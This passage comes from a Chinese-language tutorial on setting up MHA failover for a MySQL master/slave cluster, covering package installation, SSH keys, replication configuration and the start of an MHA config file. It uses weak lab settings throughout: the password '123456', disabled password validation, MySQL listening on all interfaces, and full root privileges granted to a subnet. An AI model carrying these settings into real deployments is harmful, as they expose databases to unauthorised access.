&#x63A7;&#x5236;&#x6545;&#x969C;&#x8F6C;&#x79FB;&#xFF08;&#x81EA;&#x52A8;&#x6216;&#x624B;&#x52A8;&#xFF09; masterha_conf_host &#x6DFB;&#x52A0;&#x6216;&#x5220;&#x9664;&#x914D;&#x7F6E;&#x7684;server&#x4FE1;&#x606F; MHA Node&#x5DE5;&#x5177;&#x5305;&#xFF08;&#x8FD9;&#x4E9B;&#x5DE5;&#x5177;&#x901A;&#x5E38;&#x6709;MHA Manager&#x7684;&#x811A;&#x672C;&#x89E6;&#x53D1;&#xFF0C;&#x65E0;&#x9700;&#x4EBA;&#x4E3A;&#x64CD;&#x4F5C;&#xFF09;&#x4E3B;&#x8981;&#x5305;&#x62EC;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x5DE5;&#x5177;&#xFF1A; &#x540D; &#x79F0; &#x4F5C; &#x7528; save_binary_logs &#x4FDD;&#x5B58;&#x548C;&#x590D;&#x5236;master&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7; apply_diff_relay_logs &#x8BC6;&#x522B;&#x5DEE;&#x5F02;&#x7684;&#x4E2D;&#x7EE7;&#x65E5;&#x5FD7;&#x4E8B;&#x4EF6;&#x5E76;&#x5C06;&#x5176;&#x5DEE;&#x5F02;&#x7684;&#x4E8B;&#x4EF6;&#x5E94;&#x7528;&#x4E8E;&#x5176;&#x4ED6;&#x7684;slave filter_mysqlbinlog &#x53BB;&#x9664;&#x4E0D;&#x5FC5;&#x8981;&#x7684;ROLLBACK&#x4E8B;&#x4EF6;&#xFF08;&#x5DF2;&#x5E9F;&#x5F03;&#xFF09; purge_relay_logs &#x6E05;&#x9664;&#x4E2D;&#x7EE7;&#x65E5;&#x5FD7;&#xFF08;&#x4E0D;&#x4F1A;&#x963B;&#x585E;SQL&#x7EBF;&#x7A0B;&#xFF09; &#x6CE8;&#x610F;&#xFF1A;&#x4E3A;&#x4E86;&#x5C3D;&#x53EF;&#x80FD;&#x7684;&#x51CF;&#x5C11;&#x4E3B;&#x5E93;&#x786C;&#x4EF6;&#x635F;&#x574F;&#x5B95;&#x673A;&#x9020;&#x6210;&#x7684;&#x6570;&#x636E;&#x4E22;&#x5931;&#xFF0C;&#x56E0;&#x6B64;&#x5728;&#x914D;&#x7F6E;MHA&#x7684;&#x540C;&#x65F6;&#x5EFA;&#x8BAE;&#x914D;&#x7F6E;&#x6210;MySQL 5.5&#x7684;&#x534A;&#x540C;&#x6B65;&#x590D;&#x5236;&#x3002;&#x5173;&#x4E8E;&#x534A;&#x540C;&#x6B65;&#x590D;&#x5236;&#x539F;&#x7406;&#x5404;&#x4F4D;&#x81EA;&#x5DF1;&#x8FDB;&#x884C;&#x67E5;&#x9605;&#x3002;&#xFF08;&#x4E0D;&#x662F;&#x5FC5;&#x987B;&#xFF09; 1. &#x5B89;&#x88C5;&#x90E8;&#x7F72;MHA&#x63A5;&#x4E0B;&#x6765;&#x90E8;&#x7F72;MHA&#xFF0C;&#x5177;&#x4F53;&#x7684;&#x642D;&#x5EFA;&#x73AF;&#x5883;&#x5982;&#x4E0B;&#xFF08;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x4E3A;2&#x53F0;CentOS7.4 64bit&#xFF0C;2&#x53F0;RHEL7.3 64bit&#xFF09; &#x89D2;&#x8272; IP&#x5730;&#x5740; &#x4E3B;&#x673A;&#x540D; &#x5DE5;&#x5177; &#x64CD;&#x4F5C;&#x7CFB;&#x7EDF; manager 192.168.73.20 ctos7mini mha4mysql-manager,mha4mysql-node CentOS7.4 x64 master 192.168.73.21 rhel7 mha4mysql-node RHEL7.3 x64 slave,candicate master 192.168.73.22 rhel_sqlsrv mha4mysql-node RHEL7.3 x64 slave 192.168.73.23 ctos_sqlsrv mha4mysql-node CentOS7.4 x64 &#x5176;&#x4E2D;master&#x5BF9;&#x5916;&#x63D0;&#x4F9B;&#x5199;&#x670D;&#x52A1;&#xFF0C;&#x5907;&#x9009;Candicate master&#xFF08;&#x5B9E;&#x9645;&#x4E3A;slave1&#xFF09;&#x63D0;&#x4F9B;&#x8BFB;&#x670D;&#x52A1;&#xFF0C;slave2&#x4E5F;&#x63D0;&#x4F9B;&#x8BFB;&#x670D;&#x52A1;&#xFF0C;&#x4E00;&#x65E6;master&#x5B95;&#x673A;&#xFF0C;&#x5C06;&#x4F1A;&#x628A;&#x5907;&#x9009;master&#x63D0;&#x5347;&#x4E3A;&#x65B0;&#x7684;master&#xFF0C;slave&#x6307;&#x5411;&#x65B0;&#x7684;master &#xFF08;1&#xFF09;&#x5728;&#x5B89;&#x88C5;MHA&#x5DE5;&#x5177;&#x4E4B;&#x524D;&#xFF0C;&#x5148;&#x8981;&#x5B89;&#x88C5;epel&#x6E90;&#xFF0C;&#x89E3;&#x51B3;&#x4F9D;&#x8D56;&#x5305;&#x95EE;&#x9898;&#xFF1A; Centos6&#x5B89;&#x88C5;&#x6E90;&#xFF1A; rpm -ivh http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm&#xFF08;&#x5DF2;&#x5931;&#x6548;&#xFF0C;&#x5B98;&#x65B9;&#x4E0D;&#x518D;&#x652F;&#x6301;&#xFF09;Centos7&#x5B89;&#x88C5;&#x6E90;&#xFF1A; rpm -ivh https://dl.fedoraproject.org/pub/epel/7/x86_64/Packages/e/epel-release-7-14.noarch.rpmCentos8&#x5B89;&#x88C5;&#x6E90;&#xFF1A;8&#x4EE5;&#x4E0A;&#x9700;&#x8981;&#x5B89;&#x88C5;2&#x4E2A;&#xFF1A; rpm -ivh https://dl.fedoraproject.org/pub/epel/8/Everything/x86_64/Packages/e/epel-release-8-15.el8.noarch.rpm rpm -ivh https://dl.fedoraproject.org/pub/epel/8/Everything/x86_64/Packages/e/epel-next-release-8-15.el8.noarch.rpm Centos9&#x5B89;&#x88C5;&#x6E90;&#xFF1A; rpm -ivh https://dl.fedoraproject.org/pub/epel/9/Everything/x86_64/Packages/e/epel-release-9-2.el9.noarch.rpm rpm -ivh https://dl.fedoraproject.org/pub/epel/9/Everything/x86_64/Packages/e/epel-next-release-9-2.el9.noarch.rpm RHEL7&#x5B89;&#x88C5;&#x6E90;&#xFF1A;yum install https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpmRHEL8&#x5B89;&#x88C5;&#x6E90;&#xFF1A;dnf install https://dl.fedoraproject.org/pub/epel/epel-release-latest-8.noarch.rpmRHEL9-Beta&#x5B89;&#x88C5;&#x6E90;&#xFF1A;dnf install https://dl.fedoraproject.org/pub/epel/epel-release-latest-9.noarch.rpm MHA Manager&#x4E2D;&#x4E3B;&#x8981;&#x5305;&#x62EC;&#x4E86;&#x51E0;&#x4E2A;&#x7BA1;&#x7406;&#x5458;&#x7684;&#x547D;&#x4EE4;&#x884C;&#x5DE5;&#x5177;&#xFF0C;&#x4F8B;&#x5982;master_manger&#xFF0C;master_master_switch&#x7B49;&#xFF1B;MHA Manger&#x4E5F;&#x4F9D;&#x8D56;&#x4E8E;perl&#x6A21;&#x5757;&#xFF0C;&#x5177;&#x4F53;&#x5982;&#x4E0B;&#xFF1A; &#xFF08;1&#xFF09;&#x5B89;&#x88C5;MHA Node&#x8F6F;&#x4EF6;&#x5305;&#x4E4B;&#x524D;&#x9700;&#x8981;&#x5B89;&#x88C5;&#x4F9D;&#x8D56;&#xFF0C;&#x6211;&#x8FD9;&#x91CC;&#x4F7F;&#x7528;yum&#x5B8C;&#x6210;&#xFF0C;&#x9996;&#x5148;epel&#x6E90;&#x8981;&#x5B89;&#x88C5;&#x6CE8;&#x610F;&#xFF1A;&#x521A;&#x624D;&#x5DF2;&#x7ECF;&#x914D;&#x7F6E;epel&#x6E90; &#xFF08;2&#xFF09;&#x5B89;&#x88C5;MHA Manager &#x9996;&#x5148;&#x5B89;&#x88C5;MHA Manger&#x4F9D;&#x8D56;&#x7684;perl&#x6A21;&#x5757;&#xFF08;&#x6211;&#x8FD9;&#x91CC;&#x4F7F;&#x7528;yum&#x5B89;&#x88C5;&#xFF09;&#xFF1A; &#x5728;&#x6240;&#x6709;&#x673A;&#x5668;&#x4E0A;&#x4F7F;&#x7528;yum&#x5B89;&#x88C5;&#x5168;&#x90E8;&#x4F9D;&#x8D56; yum install perl-DBD-MySQL perl-Config-Tiny perl-Log-Dispatch perl-Parallel-ForkManager perl-Time-HiRes perl-ExtUtils-CBuilder perl-ExtUtils-MakeMaker perl-CPAN -y &#x6CE8;&#xFF01;&#x5728;RHEL&#x7CFB;&#x7EDF;&#x4E2D;&#x5B89;&#x88C5;&#x4E86;epel&#x6E90;&#x4E4B;&#x540E;&#x4F9D;&#x65E7;&#x4F1A;&#x51FA;&#x73B0;&#x7F3A;&#x5C11;&#x4F9D;&#x8D56;&#x5305;&#x95EE;&#x9898; &#xFF08;2&#xFF09;&#x83B7;&#x53D6;MHA&#x76F8;&#x5173;&#x5305;&#xFF0C;&#x5728;&#x6240;&#x6709;&#x7684;&#x8282;&#x70B9;&#x5B89;&#x88C5;mha-node&#xFF1A; &#x76F8;&#x5173;&#x4E0B;&#x8F7D;&#x5730;&#x5740;&#xFF1A;&#x963F;&#x91CC;&#x4E91;&#x76D8;&#x5206;&#x4EAB;&#xFF1A;https://www.aliyundrive.com/s/cMNxKg6srT6mha_manager_0.55 (RHEL/CentOS 4,5)https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/mysql-master-ha/mha4mysql-manager-0.55-1.el5.noarch.rpmmha_manager_0.55 (RHEL/CentOS 6)https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/mysql-master-ha/mha4mysql-manager-0.55-0.el6.noarch.rpm mha_manager_0.54 (RHEL/CentOS 4,5)https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/mysql-master-ha/mha4mysql-manager-0.54-0.el5.noarch.rpmmha_manager_0.54 (RHEL/CentOS 6)https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/mysql-master-ha/mha4mysql-manager-0.54-0.el6.noarch.rpm mha_node_0.54 (RHEL/CentOS 4,5)https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/mysql-master-ha/mha4mysql-node-0.54-1.el5.noarch.rpmmha_node_0.54 (RHEL/CentOS 6)https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/mysql-master-ha/mha4mysql-node-0.54-0.el6.noarch.rpm mha_node&#x5B89;&#x88C5;&#x5B8C;&#x6210;&#x540E;&#x4F1A;&#x5728;/usr/bin/&#x76EE;&#x5F55;&#x4E0B;&#x751F;&#x6210;&#x4EE5;&#x4E0B;&#x811A;&#x672C;&#x6587;&#x4EF6;&#xFF1A;12345678[root@ctos7mini ~]&amp; rpm -ivh mha4mysql-node-0.54-0.el6.noarch.rpm[root@ctos7mini ~]&amp; cd /usr/bin/[root@ctos7mini bin]&amp; ll app* filter* purge* save*-rwxr-xr-x. 1 root root 15977 Dec 1 2012 apply_diff_relay_logs-rwxr-xr-x. 1 root root 4807 Dec 1 2012 filter_mysqlbinlog-rwxr-xr-x. 1 root root 7401 Dec 1 2012 purge_relay_logs-rwxr-xr-x. 1 root root 7263 Dec 1 2012 save_binary_logs[root@ctos7mini bin]&amp; &#xFF08;3&#xFF09;&#x5B89;&#x88C5;MHA Manager &#x5B89;&#x88C5;MHA Manager&#x8F6F;&#x4EF6;&#x5305;&#xFF1A;12345[root@ctos7mini mysql_master_ha]# rpm -ivh mha4mysql-manager-0.54-0.el6.noarch.rpmPreparing... ################################# [100%]Updating / installing... 1:mha4mysql-manager-0.54-0.el6 ################################# [100%][root@ctos7mini mysql_master_ha]# &#x6CE8;&#x610F;&#xFF01; &#x5982;&#x679C;&#x5728;RHEL&#x4E0A;&#x53EF;&#x80FD;&#x51FA;&#x73B0;&#x65E0;&#x6CD5;&#x5B89;&#x88C5;MHA Manager&#xFF0C;&#x51FA;&#x73B0;&#x7F3A;&#x5C11;&#x4F9D;&#x8D56;&#xFF0C;&#x63D0;&#x793A;&#x9700;&#x8981;&#x5B89;&#x88C5;perl-Config-Tiny&#x9700;&#x8981;&#x5728;rhel&#x7CFB;&#x7EDF;&#x624B;&#x52A8;&#x4E0B;&#x8F7D;&#x5B89;&#x88C5;&#xFF1A; rpm -ivh http://mirror.centos.org/centos/7/os/x86_64/Packages/perl-Config-Tiny-2.14-7.el7.noarch.rpm MHA Manager&#x5B89;&#x88C5;&#x5B8C;&#x6210;&#x540E;&#x4F1A;&#x5728;/usr/bin&#x76EE;&#x5F55;&#x4E0B;&#x9762;&#x751F;&#x6210;&#x4EE5;&#x4E0B;&#x811A;&#x672C;&#x6587;&#x4EF6;&#xFF0C;&#x524D;&#x9762;&#x5DF2;&#x7ECF;&#x8BF4;&#x8FC7;&#x8FD9;&#x4E9B;&#x811A;&#x672C;&#x7684;&#x4F5C;&#x7528;&#xFF0C;&#x8FD9;&#x91CC;&#x4E0D;&#x518D;&#x91CD;&#x590D;1234567891011[root@ctos7mini mysql_master_ha]&amp;ll /usr/bin/mast*-rwxr-xr-x. 1 root root 1995 Dec 1 2012 /usr/bin/masterha_check_repl-rwxr-xr-x. 1 root root 1779 Dec 1 2012 /usr/bin/masterha_check_ssh-rwxr-xr-x. 1 root root 1865 Dec 1 2012 /usr/bin/masterha_check_status-rwxr-xr-x. 1 root root 3201 Dec 1 2012 /usr/bin/masterha_conf_host-rwxr-xr-x. 1 root root 2517 Dec 1 2012 /usr/bin/masterha_manager-rwxr-xr-x. 1 root root 2165 Dec 1 2012 /usr/bin/masterha_master_monitor-rwxr-xr-x. 1 root root 2373 Dec 1 2012 /usr/bin/masterha_master_switch-rwxr-xr-x. 1 root root 3879 Dec 1 2012 /usr/bin/masterha_secondary_check-rwxr-xr-x. 1 root root 1739 Dec 1 2012 /usr/bin/masterha_stop[root@ctos7mini mysql_master_ha]&amp; &#xFF08;4&#xFF09;&#x914D;&#x7F6E;&#x6240;&#x6709;&#x4E3B;&#x673A;&#x76F8;&#x4E92;SSH&#x767B;&#x5F55;&#x65E0;&#x5BC6;&#x7801;&#x9A8C;&#x8BC1;&#xFF08;&#x4F7F;&#x7528;key&#x767B;&#x5F55;&#xFF0C;&#x5DE5;&#x4F5C;&#x4E2D;&#x5E38;&#x7528;&#xFF09;&#x6709;&#x4E00;&#x70B9;&#x9700;&#x8981;&#x6CE8;&#x610F;&#xFF1A;&#x4E0D;&#x80FD;&#x7981;&#x6B62; password &#x767B;&#x9646;&#xFF0C;&#x5426;&#x5219;&#x4F1A;&#x51FA;&#x73B0;&#x9519;&#x8BEF; &#x5728;&#x6240;&#x6709;&#x4E3B;&#x673A;&#x4E0A;&#x914D;&#x7F6E;ssh&#x514D;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#xFF1A;12345678910111213141516171819202122[root@rhel7 ~]# ssh-keygen -t rsaGenerating public/private rsa key pair.Enter file in which to save the key (/root/.ssh/id_rsa): &#x56DE;&#x8F66;Enter passphrase (empty for no passphrase): &#x56DE;&#x8F66;Enter same passphrase again: &#x56DE;&#x8F66;Your identification has been saved in /root/.ssh/id_rsa.Your public key has been saved in /root/.ssh/id_rsa.pub.The key fingerprint is:c2:95:fa:7e:f5:ef:07:3f:70:a2:ec:bb:3a:5a:9f:d9 root@rhel7The key&apos;s randomart image is:+--[ RSA 2048]----+| || . || o || . o || + S || o .o.. || ......+o || ...oo+ ..o|| .oo+BoE o=|+-----------------+[root@rhel7 ~]# 123[root@rhel7 ~]&amp; ssh-copy-id root@192.168.73.20[root@rhel7 ~]&amp; ssh-copy-id root@192.168.73.22[root@rhel7 ~]&amp; ssh-copy-id root@192.168.73.23 &#x5176;&#x4ED6;&#x4E3B;&#x673A;&#x91CD;&#x590D;&#x4EE5;&#x4E0A;&#x64CD;&#x4F5C; ssh&#x914D;&#x7F6E;&#x6269;&#x5C55; &#x89E3;&#x51B3;rhel&#x8FDE;&#x63A5;ssh&#x7B49;&#x5F85;&#x65F6;&#x95F4;&#x8FC7;&#x4E45;&#x7684;&#x95EE;&#x9898; 1234[root@rhel7 ~]&amp; vim /etc/ssh/sshd_config# &#x53BB;&#x6389;&#x6CE8;&#x91CA;&#xFF0C;&#x6539;&#x4E3A;noUseDNS no 2. &#x642D;&#x5EFA;MySQL&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x73AF;&#x5883;&#x6CE8;&#x610F;&#xFF1A;binlog-do-db &#x548C; replicate-ignore-db &#x8BBE;&#x7F6E;&#x5FC5;&#x987B;&#x76F8;&#x540C;&#xFF1B;MHA &#x5728;&#x542F;&#x52A8;&#x65F6;&#x5019;&#x4F1A;&#x68C0;&#x6D4B;&#x8FC7;&#x6EE4;&#x89C4;&#x5219;&#xFF0C;&#x5982;&#x679C;&#x8FC7;&#x6EE4;&#x89C4;&#x5219;&#x4E0D;&#x540C;&#xFF0C;MHA &#x4E0D;&#x542F;&#x52A8;&#x76D1;&#x63A7;&#x548C;&#x6545;&#x969C;&#x8F6C;&#x79FB; &#x5728;192.168.73.21&#x4E0A;&#x914D;&#x7F6E;MySQL master&#x521B;&#x5EFA;&#x9700;&#x8981;&#x540C;&#x6B65;&#x7684;&#x6570;&#x636E;&#x5E93;1234mysql -uroot -p123456mysql&gt; CREATE DATABASE ha DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;mysql&gt; use HA;mysql&gt; CREATE TABLE test(id int,name varchar(20)); &#x914D;&#x7F6E;my.cnf&#xFF0C;&#x6DFB;&#x52A0;&#x9700;&#x8981;&#x7684;&#x53C2;&#x6570;&#xFF1A;1234567891011121314# &#x5141;&#x8BB8;&#x8FDC;&#x7A0B;&#x8BBF;&#x95EE;bind-address = 0.0.0.0# &#x542F;&#x7528;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;log-bin=mysql-bin-master# &#x672C;&#x673A;&#x6570;&#x636E;&#x5E93;ID&#x6807;&#x8BC6;server-id=1# &#x53EF;&#x4EE5;&#x88AB;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x590D;&#x5236;&#x7684;&#x5E93;&#xFF0C;&#x4E8C;&#x8FDB;&#x5236;&#x9700;&#x8981;&#x540C;&#x6B65;&#x7684;&#x6570;&#x636E;&#x5E93;&#x540D;binlog-do-db=ha# &#x4E0D;&#x53EF;&#x4EE5;&#x88AB;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x590D;&#x5236;&#x7684;&#x5E93;binlog-ignore-db=mysql# [&#x53EF;&#x9009;]&#x81EA;MySQL5.6&#x7248;&#x672C;&#xFF0C;&#x5F15;&#x5165;&#x4E86;&#x65B0;&#x5BC6;&#x7801;&#x6821;&#x9A8C;&#x63D2;&#x4EF6;validate_password, &#x7528;&#x4E8E;&#x7BA1;&#x7406;&#x7528;&#x6237;&#x5BC6;&#x7801;&#x957F;&#x5EA6;&#x3001;&#x5F3A;&#x5EA6;&#x7B49;&#xFF0C;&#x4FDD;&#x969C;&#x8D26;&#x53F7;&#x7684;&#x5B89;&#x5168;&#x6027;validate-password=off &#x6587;&#x6863;&#xFF1A;&#x5B89;&#x88C5;validate_password&#x63D2;&#x4EF6;.mdhttp://note.youdao.com/noteshare?id=3808ed864a33805181a8cbea885a6784&amp;sub=02140C7F57F9404499D06E2EF7006296 &#x91CD;&#x542F;MySQL &#x6388;&#x6743;12345mysql&gt; grant replication slave on *.* to slave@&apos;192.168.73.%&apos; identified by &apos;123456&apos;;Query OK, 0 rows affected, 1 warning (0.00 sec)mysql&gt; flush privileges;Query OK, 0 rows affected (0.00 sec) &#x67E5;&#x770B;&#x72B6;&#x6001;&#x4FE1;&#x606F;123456789mysql&gt; show master status;+-------------------------+----------+--------------+------------------+-------------------+| File | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |+-------------------------+----------+--------------+------------------+-------------------+| mysql-bin-master.000001 | 154 | ha | mysql | |+-------------------------+----------+--------------+------------------+-------------------+1 row in set (0.00 sec)mysql&gt; &#x5728;192.168.73.22&#x4E0A;&#x914D;&#x7F6E;MySQL slave&#x914D;&#x7F6E;my.cnf&#xFF0C;&#x6DFB;&#x52A0;&#x9700;&#x8981;&#x7684;&#x53C2;&#x6570;&#xFF1A; 12345678bind-address = 0.0.0.0log-bin=mysql-slave1server-id=2binlog-do-db=habinlog-ignore-db=mysql#&#x53EA;&#x6709;&#x5F00;&#x542F;log_slave_updates&#xFF0C;&#x4ECE;&#x5E93;binlog&#x624D;&#x4F1A;&#x8BB0;&#x5F55;&#x4E3B;&#x5E93;&#x540C;&#x6B65;&#x7684;&#x64CD;&#x4F5C;&#x65E5;&#x5FD7;log_slave_updates=1 &#x91CD;&#x542F;MySQL &#x6388;&#x6743;&#x5E76;&#x5EFA;&#x7ACB;&#x4E3B;&#x4ECE;&#x5173;&#x7CFB;123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354mysql&gt; grant replication slave on *.* to slave@&apos;192.168.73.%&apos; identified by &apos;123456&apos;;Query OK, 0 rows affected, 1 warning (0.00 sec)mysql&gt; change master to master_host=&apos;192.168.73.21&apos;,master_user=&apos;slave&apos;,master_password=&apos;123456&apos;;Query OK, 0 rows affected, 2 warnings (0.01 sec)mysql&gt; flush privileges;Query OK, 0 rows affected (0.00 sec)mysql&gt; show master status;+---------------------+----------+--------------+------------------+-------------------+| File | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |+---------------------+----------+--------------+------------------+-------------------+| mysql-slave1.000002 | 154 | ha | mysql | |+---------------------+----------+--------------+------------------+-------------------+1 row in set (0.00 sec)mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || mysql || performance_schema || sys |+--------------------+4 rows in set (0.00 sec)mysql&gt; show slave status\\G*************************** 1. row *************************** Slave_IO_State: Waiting for master to send event Master_Host: 192.168.73.21 Master_User: slave Master_Port: 3306 Connect_Retry: 60 Master_Log_File: mysql-bin-master.000002 Read_Master_Log_Pos: 154 Relay_Log_File: ctos_sqlsrv-relay-bin.000011 Relay_Log_Pos: 381 Relay_Master_Log_File: mysql-bin-master.000002 Slave_IO_Running: Yes Slave_SQL_Running: Yes Replicate_Do_DB:.................................................&#x7701;&#x7565;....................................................... Master_UUID: 8f5a42da-cd2d-11ec-8c02-000c29f9275c Master_Info_File: /var/lib/mysql/master.info SQL_Delay: 0 SQL_Remaining_Delay: NULL Slave_SQL_Running_State: Slave has read all relay log; waiting for more updates Master_Retry_Count: 86400.................................................&#x7701;&#x7565;........................................................1 row in set (0.00 sec)mysql&gt; &#x5728;192.168.73.23&#x4E0A;&#x914D;&#x7F6E;MySQL slave&#x914D;&#x7F6E;my.cnf&#xFF0C;&#x6DFB;&#x52A0;&#x9700;&#x8981;&#x7684;&#x53C2;&#x6570;&#xFF1A;1234567bind-address = 0.0.0.0log-bin=mysql-slave2server-id=3binlog-do-db=habinlog-ignore-db=mysqllog_slave_updates=1 &#x91CD;&#x542F;MySQL &#x6388;&#x6743;&#x5E76;&#x5EFA;&#x7ACB;&#x4E3B;&#x4ECE;&#x5173;&#x7CFB;123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || mysql || performance_schema || sys |+--------------------+4 rows in set (0.00 sec)mysql&gt; show master status;+---------------------+----------+--------------+------------------+-------------------+| File | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |+---------------------+----------+--------------+------------------+-------------------+| mysql-slave2.000002 | 601 | ha | mysql | |+---------------------+----------+--------------+------------------+-------------------+1 row in set (0.00 sec)mysql&gt; change master to master_host=&apos;192.168.73.21&apos;,master_user=&apos;slave&apos;,master_password=&apos;123456&apos;;Query OK, 0 rows affected, 2 warnings (0.00 sec)mysql&gt; flush privileges;Query OK, 0 rows affected (0.00 sec)mysql&gt; start slave;Query OK, 0 rows affected (0.00 sec)mysql&gt; show slave status\\G*************************** 1. row *************************** Slave_IO_State: Waiting for master to send event Master_Host: 192.168.73.21 Master_User: slave Master_Port: 3306 Connect_Retry: 60 Master_Log_File: mysql-bin-master.000002 Read_Master_Log_Pos: 154 Relay_Log_File: rhel_sqlsrv-relay-bin.000003 Relay_Log_Pos: 381 Relay_Master_Log_File: mysql-bin-master.000002 Slave_IO_Running: Yes Slave_SQL_Running: Yes.................................................&#x7701;&#x7565;....................................................... Master_Server_Id: 1 Master_UUID: 8f5a42da-cd2d-11ec-8c02-000c29f9275c Master_Info_File: /var/lib/mysql/master.info SQL_Delay: 0 SQL_Remaining_Delay: NULL Slave_SQL_Running_State: Slave has read all relay log; waiting for more updates Master_Retry_Count: 86400.................................................&#x7701;&#x7565;.......................................................1 row in set (0.00 sec)mysql&gt; &#x4E24;&#x53F0;slave&#x670D;&#x52A1;&#x5668;&#x8BBE;&#x7F6E;read_only&#xFF08;&#x4ECE;&#x5E93;&#x5BF9;&#x5916;&#x63D0;&#x4F9B;&#x8BFB;&#x670D;&#x52A1;&#xFF0C;&#x53EA;&#x6240;&#x4EE5;&#x6CA1;&#x6709;&#x5199;&#x8FDB;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x662F;&#x56E0;&#x4E3A;slave&#x968F;&#x65F6;&#x4F1A;&#x63D0;&#x5347;&#x4E3A;master&#xFF09; 1234mysql&gt; set global read_only=1;Query OK, 0 rows affected (0.00 sec)mysql&gt; &#x521B;&#x5EFA;&#x76D1;&#x63A7;&#x7528;&#x6237;&#xFF08;&#x5728;&#x4E3B;&#x4ECE;&#x4E0A;&#x90FD;&#x6267;&#x884C;&#xFF09;&#xFF1A;123grant all privileges on *.* to &apos;root&apos;@&apos;192.168.10.%&apos; identified&#xA0; by &apos;123456&apos;;flush privileges; &#x5230;&#x8FD9;&#x91CC;&#x6574;&#x4E2A;&#x96C6;&#x7FA4;&#x73AF;&#x5883;&#x5DF2;&#x7ECF;&#x642D;&#x5EFA;&#x5B8C;&#x6BD5;&#xFF0C;&#x5269;&#x4E0B;&#x7684;&#x5C31;&#x662F;&#x914D;&#x7F6E;MHA&#x8F6F;&#x4EF6;&#x4E86; 3. &#x914D;&#x7F6E;MHA&#xFF08;1&#xFF09;&#x521B;&#x5EFA;MHA&#x7684;&#x5DE5;&#x4F5C;&#x76EE;&#x5F55;&#xFF0C;&#x5E76;&#x4E14;&#x521B;&#x5EFA;&#x76F8;&#x5173;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF08;&#x5728;&#x8F6F;&#x4EF6;&#x5305;&#x89E3;&#x538B;&#x540E;&#x7684;&#x76EE;&#x5F55;&#x91CC;&#x9762;&#x6709;&#x6837;&#x4F8B;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF09; 123[root@ctos7mini ~]&amp; mkdir -p /etc/masterha[root@ctos7mini ~]&amp; mkdir -p /var/log/masterha/app1[root@ctos7mini ~]&amp; vim /etc/masterha/app1.cnf &#x4FEE;&#x6539;app1.cnf&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x4FEE;&#x6539;&#x540E;&#x7684;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x5982;&#x4E0B;&#xFF08;&#x6CE8;&#x610F;&#xFF0C;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x6CE8;&#x91CA;&#x9700;&#x8981;&#x53BB;&#x6389;&#xFF0C;&#x6211;&#x8FD9;&#x91CC;&#x662F;&#x4E3A;&#x4E86;&#x89E3;&#x91CA;&#x6E05;&#x695A;&#xFF09;&#xFF1A; &#x53C2;&#x6570;&#x8BF4;&#x660E;1234567891011121314151617181920212223242526272829[server default]manager_workdir=/var/log/masterha/app1&#xA0; &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;//&#x8BBE;&#x7F6E;manager&#x7684;&#x5DE5;&#x4F5C;&#x76EE;&#x5F55;manager_log=/var/log/masterha/app1/manager.log&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; //&#x8BBE;&#x7F6E;manager&#x7684;&#x65E5;&#x5FD7;master_binlog_dir=/data/mysql&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; //&#x8BBE;&#x7F6E;master &#x4FDD;&#x5B58;binlog&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x4EE5;&#x4FBF;MHA&#x53EF;&#x4EE5;&#x627E;&#x5230;master&#x7684;&#x65E5;&#x5FD7;&#xFF0C;&#x6211;&#x8FD9;&#x91CC;&#x7684;&#x4E5F;&#x5C31;&#x662F;mysql&#x7684;&#x6570;&#x636E;&#x76EE;&#x5F55;master_ip_failover_script= /usr/local/bin/master_ip_failover&#xA0;&#xA0;&#xA0; //&#x8BBE;&#x7F6E;&#x81EA;&#x52A8;failover&#x65F6;&#x5019;&#x7684;&#x5207;&#x6362;&#x811A;&#x672C;master_ip_online_change_script= /usr/local/bin/master_ip_online_change&#xA0; //&#x8BBE;&#x7F6E;&#x624B;&#x52A8;&#x5207;&#x6362;&#x65F6;&#x5019;&#x7684;&#x5207;&#x6362;&#x811A;&#x672C;password=123456&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 